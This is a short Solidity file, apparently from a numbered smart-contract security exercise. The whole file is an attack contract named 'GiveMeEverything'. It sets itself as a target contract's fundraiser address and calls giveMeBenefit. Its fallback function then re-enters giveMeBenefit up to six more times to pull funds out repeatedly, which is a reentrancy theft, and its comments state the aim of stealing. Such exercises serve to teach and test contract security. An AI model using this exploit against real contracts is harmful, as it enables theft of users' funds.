pragma solidity ^0.4.0;

import "9.sol";

// I need no ether to attack

contract GiveMeEverything {
    ERC20nator public fr;
    uint64 public theif_counter;
    
    constructor() payable {
        
    }
    
    function startAttack(address _addr) public {
        fr = ERC20nator(_addr);
        
        theif_counter = 0;
        theif_counter++;
        
        fr.setFundraiserAddress(address(this));
        fr.giveMeBenefit();

        
    }
    
    function() public payable {
        
        // tries to steal a limited times to that the attack is successful (does not drain the resources)
        
        if (theif_counter < 6) {
            theif_counter++;
            
            fr.giveMeBenefit();

        }
        
        
    }
    
}